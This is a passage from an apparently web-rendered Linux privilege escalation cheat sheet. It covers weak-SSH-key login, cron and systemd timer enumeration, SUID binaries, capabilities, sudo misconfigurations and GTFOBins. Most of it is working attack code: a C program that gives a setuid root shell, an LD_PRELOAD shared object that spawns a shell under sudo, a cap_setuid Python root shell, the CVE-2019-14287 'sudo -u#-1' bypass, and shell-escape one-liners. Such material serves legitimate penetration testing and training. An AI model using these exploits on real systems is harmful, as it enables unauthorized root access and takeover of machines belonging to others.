<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>grep -lr &#39;AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf&#39;
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
</code></pre></div>
<ol>
<li>IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do:</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
</code></pre></div>
<p>And you should connect without requiring a password. If stuck, the <code>-vvv</code> verbosity should provide enough details as to why.</p>
<h2 id="scheduled-tasks">Scheduled tasks</h2>
<h3 id="cron-jobs">Cron jobs</h3>
<p>Check if you have access with write permission on these files. <br />
Check inside the file, to find other paths with write permissions.   </p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">init</span><span class="p">.</span><span class="n">d</span>
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">cron</span><span class="p">*</span>
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">crontab</span>
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">cron</span><span class="p">.</span><span class="n">allow</span>
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">cron</span><span class="p">.</span><span class="n">d</span> 
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">cron</span><span class="p">.</span><span class="n">deny</span>
<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">cron</span><span class="p">.</span><span class="n">daily</span>
<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">cron</span><span class="p">.</span><span class="n">hourly</span>
<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">cron</span><span class="p">.</span><span class="n">monthly</span>
<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">cron</span><span class="p">.</span><span class="n">weekly</span>
<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">sudoers</span>
<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">exports</span>
<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">anacrontab</span>
<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">spool</span><span class="p">/</span><span class="n">cron</span>
<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">spool</span><span class="p">/</span><span class="n">cron</span><span class="p">/</span><span class="n">crontabs</span><span class="p">/</span><span class="n">root</span>
<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>
<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="n">crontab</span> <span class="n">-l</span>
<a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="nb">ls </span><span class="n">-alh</span> <span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">spool</span><span class="p">/</span><span class="n">cron</span><span class="p">;</span>
<a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="nb">ls </span><span class="n">-al</span> <span class="p">/</span><span class="n">etc</span><span class="p">/</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">cron</span>
<a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="nb">ls </span><span class="n">-al</span> <span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">cron</span><span class="p">*</span>
<a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a><span class="nb">cat </span><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">cron</span><span class="p">*</span>
<a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a><span class="nb">cat </span><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">at</span><span class="p">.</span><span class="n">allow</span>
<a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a><span class="nb">cat </span><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">at</span><span class="p">.</span><span class="n">deny</span>
<a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a><span class="nb">cat </span><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">cron</span><span class="p">.</span><span class="n">allow</span>
<a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a><span class="nb">cat </span><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">cron</span><span class="p">.</span><span class="n">deny</span><span class="p">*</span>
</code></pre></div>
<p>You can use <a href="https://github.com/DominicBreuker/pspy">pspy</a> to detect a CRON job.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c"># print both commands and file system events and scan procfs every 1000 ms (=1sec)</span>
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="p">./</span><span class="n">pspy64</span> <span class="n">-pf</span> <span class="n">-i</span> <span class="n">1000</span> 
</code></pre></div>
<h2 id="systemd-timers">Systemd timers</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">systemctl</span> <span class="n">list-timers</span> <span class="p">-</span><span class="n">-all</span>
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">NEXT</span>                          <span class="n">LEFT</span>     <span class="n">LAST</span>                          <span class="n">PASSED</span>             <span class="n">UNIT</span>                         <span class="n">ACTIVATES</span>
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="n">Mon</span> <span class="n">2019</span><span class="p">-</span><span class="n">04</span><span class="p">-</span><span class="n">01</span> <span class="n">02</span><span class="p">:</span><span class="n">59</span><span class="p">:</span><span class="n">14</span> <span class="n">CEST</span>  <span class="n">15h</span> <span class="n">left</span> <span class="n">Sun</span> <span class="n">2019</span><span class="p">-</span><span class="n">03</span><span class="p">-</span><span class="n">31</span> <span class="n">10</span><span class="p">:</span><span class="n">52</span><span class="p">:</span><span class="n">49</span> <span class="n">CEST</span>  <span class="n">24min</span> <span class="n">ago</span>          <span class="n">apt-daily</span><span class="p">.</span><span class="n">timer</span>              <span class="n">apt-daily</span><span class="p">.</span><span class="n">service</span>
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="n">Mon</span> <span class="n">2019</span><span class="p">-</span><span class="n">04</span><span class="p">-</span><span class="n">01</span> <span class="n">06</span><span class="p">:</span><span class="n">20</span><span class="p">:</span><span class="n">40</span> <span class="n">CEST</span>  <span class="n">19h</span> <span class="n">left</span> <span class="n">Sun</span> <span class="n">2019</span><span class="p">-</span><span class="n">03</span><span class="p">-</span><span class="n">31</span> <span class="n">10</span><span class="p">:</span><span class="n">52</span><span class="p">:</span><span class="n">49</span> <span class="n">CEST</span>  <span class="n">24min</span> <span class="n">ago</span>          <span class="n">apt-daily-upgrade</span><span class="p">.</span><span class="n">timer</span>      <span class="n">apt-daily-upgrade</span><span class="p">.</span><span class="n">service</span>
<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="n">Mon</span> <span class="n">2019</span><span class="p">-</span><span class="n">04</span><span class="p">-</span><span class="n">01</span> <span class="n">07</span><span class="p">:</span><span class="n">36</span><span class="p">:</span><span class="n">10</span> <span class="n">CEST</span>  <span class="n">20h</span> <span class="n">left</span> <span class="n">Sat</span> <span class="n">2019</span><span class="p">-</span><span class="n">03</span><span class="p">-</span><span class="n">09</span> <span class="n">14</span><span class="p">:</span><span class="n">28</span><span class="p">:</span><span class="n">25</span> <span class="n">CET</span>   <span class="n">3</span> <span class="n">weeks</span> <span class="n">0</span> <span class="n">days</span> <span class="n">ago</span> <span class="n">systemd-tmpfiles-clean</span><span class="p">.</span><span class="n">timer</span> <span class="n">systemd-tmpfiles-clean</span><span class="p">.</span><span class="n">service</span>
<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="n">3</span> <span class="n">timers</span> <span class="n">listed</span><span class="p">.</span>
</code></pre></div>
<h2 id="suid">SUID</h2>
<p>SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. If a file with this bit is run, the uid will be changed by the owner one. If the file owner is <code>root</code>, the uid will be changed to <code>root</code> even if it was executed from user <code>bob</code>. SUID bit is represented by an <code>s</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="err"></span><span class="n">swissky</span><span class="nv">@lab</span> <span class="p">~</span>  
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="err"></span><span class="p">$</span> <span class="nb">ls </span><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">sudo</span> <span class="n">-alh</span>                  
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">-rwsr-xr-x</span> <span class="n">1</span> <span class="n">root</span> <span class="n">root</span> <span class="n">138K</span> <span class="n">23</span> <span class="n">nov</span><span class="p">.</span>  <span class="n">16</span><span class="p">:</span><span class="n">04</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">sudo</span>
</code></pre></div>
<h3 id="find-suid-binaries">Find SUID binaries</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="se">\;</span>
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>find<span class="w"> </span>/<span class="w"> </span>-uid<span class="w"> </span><span class="m">0</span><span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</code></pre></div>
<h3 id="create-a-suid-binary">Create a SUID binary</h3>
<table>
<thead>
<tr>
<th>Function</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>setreuid()</td>
<td>sets real and effective user IDs of the calling process</td>
</tr>
<tr>
<td>setuid()</td>
<td>sets the effective user ID of the calling process</td>
</tr>
<tr>
<td>setgid()</td>
<td>sets the effective group ID of the calling process</td>
</tr>
</tbody>
</table>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>print<span class="w"> </span><span class="s1">&#39;int main(void){\nsetresuid(0, 0, 0);\nsystem(&quot;/bin/sh&quot;);\n}&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/suid.c<span class="w">   </span>
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>gcc<span class="w"> </span>-o<span class="w"> </span>/tmp/suid<span class="w"> </span>/tmp/suid.c<span class="w">  </span>
<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>sudo<span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/suid<span class="w"> </span><span class="c1"># execute right</span>
<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>sudo<span class="w"> </span>chmod<span class="w"> </span>+s<span class="w"> </span>/tmp/suid<span class="w"> </span><span class="c1"># setuid bit</span>
</code></pre></div>
<h2 id="capabilities">Capabilities</h2>
<h3 id="list-capabilities-of-binaries">List capabilities of binaries</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="err"></span><span class="n">swissky</span><span class="nv">@lab</span> <span class="p">~</span>  
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="err"></span><span class="p">$</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">getcap</span> <span class="n">-r</span>  <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span>
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">fping</span>                <span class="p">=</span> <span class="n">cap_net_raw</span><span class="p">+</span><span class="n">ep</span>
<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">dumpcap</span>              <span class="p">=</span> <span class="n">cap_dac_override</span><span class="p">,</span><span class="n">cap_net_admin</span><span class="p">,</span><span class="n">cap_net_raw</span><span class="p">+</span><span class="n">eip</span>
<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">gnome-keyring-daemon</span> <span class="p">=</span> <span class="n">cap_ipc_lock</span><span class="p">+</span><span class="n">ep</span>
<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">rlogin</span>               <span class="p">=</span> <span class="n">cap_net_bind_service</span><span class="p">+</span><span class="n">ep</span>
<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">ping</span>                 <span class="p">=</span> <span class="n">cap_net_raw</span><span class="p">+</span><span class="n">ep</span>
<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">rsh</span>                  <span class="p">=</span> <span class="n">cap_net_bind_service</span><span class="p">+</span><span class="n">ep</span>
<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">rcp</span>                  <span class="p">=</span> <span class="n">cap_net_bind_service</span><span class="p">+</span><span class="n">ep</span>
</code></pre></div>
<h3 id="edit-capabilities">Edit capabilities</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">setcap</span> <span class="n">-r</span> <span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">ping</span>            <span class="c"># remove</span>
<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">setcap</span> <span class="n">cap_net_raw</span><span class="p">+</span><span class="n">p</span> <span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">ping</span> <span class="c"># add</span>
</code></pre></div>
<h3 id="interesting-capabilities">Interesting capabilities</h3>
<p>Having the capability =ep means the binary has all the capabilities.
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="p">$</span> <span class="n">getcap</span> <span class="n">openssl</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">openssl</span> 
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="n">openssl</span><span class="p">=</span><span class="n">ep</span>
</code></pre></div></p>
<p>Alternatively the following capabilities can be used in order to upgrade your current privileges.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">cap_dac_read_search</span> <span class="c"># read anything</span>
<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="n">cap_setuid</span><span class="p">+</span><span class="n">ep</span> <span class="c"># setuid</span>
</code></pre></div>
<p>Example of privilege escalation with <code>cap_setuid+ep</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="p">$</span> <span class="n">sudo</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">setcap</span> <span class="n">cap_setuid</span><span class="p">+</span><span class="n">ep</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">python2</span><span class="p">.</span><span class="n">7</span>
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="p">$</span> <span class="n">python2</span><span class="p">.</span><span class="n">7</span> <span class="n">-c</span> <span class="s1">&#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;</span>
<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="n">sh</span><span class="p">-</span><span class="n">5</span><span class="p">.</span><span class="n">0</span><span class="c"># id</span>
<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="n">uid</span><span class="p">=</span><span class="n">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="p">=</span><span class="n">1000</span><span class="p">(</span><span class="n">swissky</span><span class="p">)</span>
</code></pre></div>
<table>
<thead>
<tr>
<th>Capabilities name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>CAP_AUDIT_CONTROL</td>
<td>Allow to enable/disable kernel auditing</td>
</tr>
<tr>
<td>CAP_AUDIT_WRITE</td>
<td>Helps to write records to kernel auditing log</td>
</tr>
<tr>
<td>CAP_BLOCK_SUSPEND</td>
<td>This feature can block system suspends</td>
</tr>
<tr>
<td>CAP_CHOWN</td>
<td>Allow user to make arbitrary change to files UIDs and GIDs</td>
</tr>
<tr>
<td>CAP_DAC_OVERRIDE</td>
<td>This helps to bypass file read, write and execute permission checks</td>
</tr>
<tr>
<td>CAP_DAC_READ_SEARCH</td>
<td>This only bypasses file and directory read/execute permission checks</td>
</tr>
<tr>
<td>CAP_FOWNER</td>
<td>This enables bypass of permission checks on operations that normally require the filesystem UID of the process to match the UID of the file</td>
</tr>
<tr>
<td>CAP_KILL</td>
<td>Allow the sending of signals to processes belonging to others</td>
</tr>
<tr>
<td>CAP_SETGID</td>
<td>Allow changing of the GID</td>
</tr>
<tr>
<td>CAP_SETUID</td>
<td>Allow changing of the UID</td>
</tr>
<tr>
<td>CAP_SETPCAP</td>
<td>Helps to transferring and removal of current set to any PID</td>
</tr>
<tr>
<td>CAP_IPC_LOCK</td>
<td>This helps to lock memory</td>
</tr>
<tr>
<td>CAP_MAC_ADMIN</td>
<td>Allow MAC configuration or state changes</td>
</tr>
<tr>
<td>CAP_NET_RAW</td>
<td>Use RAW and PACKET sockets</td>
</tr>
<tr>
<td>CAP_NET_BIND_SERVICE</td>
<td>SERVICE Bind a socket to internet domain privileged ports</td>
</tr>
</tbody>
</table>
<h2 id="sudo">SUDO</h2>
<p>Tool: <a href="https://github.com/TH3xACE/SUDO_KILLER">Sudo Exploitation</a></p>
<h3 id="nopasswd">NOPASSWD</h3>
<p>Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>$<span class="w"> </span>sudo<span class="w"> </span>-l
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>User<span class="w"> </span>demo<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>crashlab:
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="w">    </span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/usr/bin/vim
</code></pre></div>
<p>In this example the user <code>demo</code> can run <code>vim</code> as <code>root</code>, it is now trivial to get a shell by adding an ssh key into the root directory or by calling <code>sh</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>sudo<span class="w"> </span>vim<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;!sh&#39;</span>
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>sudo<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>vim<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;!sh&#39;</span>
</code></pre></div>
<h3 id="ld_preload-and-nopasswd">LD_PRELOAD and NOPASSWD</h3>
<p>If <code>LD_PRELOAD</code> is explicitly defined in the sudoers file</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">Defaults</span>        <span class="n">env_keep</span> <span class="p">+=</span> <span class="n">LD_PRELOAD</span>
</code></pre></div>
<p>Compile the following shared object using the C code below with <code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="kt">void</span><span class="w"> </span><span class="nf">_init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="w">    </span><span class="n">unsetenv</span><span class="p">(</span><span class="s">&quot;LD_PRELOAD&quot;</span><span class="p">);</span>
<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="p">}</span>
</code></pre></div>
<p>Execute any binary with the LD_PRELOAD to spawn a shell : <code>sudo LD_PRELOAD=&lt;full_path_to_so_file&gt; &lt;program&gt;</code>, e.g: <code>sudo LD_PRELOAD=/tmp/shell.so find</code></p>
<h3 id="doas">Doas</h3>
<p>There are some alternatives to the <code>sudo</code> binary such as <code>doas</code> for OpenBSD, remember to check its configuration at <code>/etc/doas.conf</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>permit<span class="w"> </span>nopass<span class="w"> </span>demo<span class="w"> </span>as<span class="w"> </span>root<span class="w"> </span>cmd<span class="w"> </span>vim
</code></pre></div>
<h3 id="sudo_inject">sudo_inject</h3>
<p>Using <a href="https://github.com/nongiach/sudo_inject">https://github.com/nongiach/sudo_inject</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="p">$</span> <span class="n">sudo</span> <span class="n">whatever</span>
<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="no">[sudo]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">user</span><span class="p">:</span>    
<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="c"># Press &lt;ctrl&gt;+c since you don&#39;t have the password. </span>
<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="c"># This creates an invalid sudo tokens.</span>
<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="p">$</span> <span class="n">sh</span> <span class="n">exploit</span><span class="p">.</span><span class="n">sh</span>
<a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="p">....</span> <span class="n">wait</span> <span class="n">1</span> <span class="n">seconds</span>
<a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="p">$</span> <span class="n">sudo</span> <span class="n">-i</span> <span class="c"># no password required :)</span>
<a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="c"># id</span>
<a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="n">uid</span><span class="p">=</span><span class="n">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="p">=</span><span class="n">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="p">=</span><span class="n">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
</code></pre></div>
<p>Slides of the presentation : <a href="https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf">https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf</a></p>
<h3 id="cve-2019-14287">CVE-2019-14287</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="c"># Exploitable when a user have the following permissions (sudo -l)</span>
<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="p">(</span><span class="n">ALL</span><span class="p">,</span> <span class="p">!</span><span class="n">root</span><span class="p">)</span> <span class="n">ALL</span>
<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>
<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="c"># If you have a full TTY, you can exploit it like this</span>
<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="n">sudo</span> <span class="n">-u</span><span class="c">#-1 /bin/bash</span>
<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="n">sudo</span> <span class="n">-u</span><span class="c">#4294967295 id</span>
</code></pre></div>
<h2 id="gtfobins">GTFOBins</h2>
<p><a href="https://gtfobins.github.io">GTFOBins</a> is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
<p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>
<blockquote>
<p>gdb -nx -ex '!sh' -ex quit  <br />
sudo mysql -e '! /bin/sh'  <br />
strace -o /dev/null /bin/sh  <br />
sudo awk 'BEGIN {system("/bin/sh")}'</p>
</blockquote>
<h2 id="wildcard">Wildcard</h2>
<p>By using tar with checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. Tricking root to use the specific options is quite easy, and that's where the wildcard comes in handy.</p>
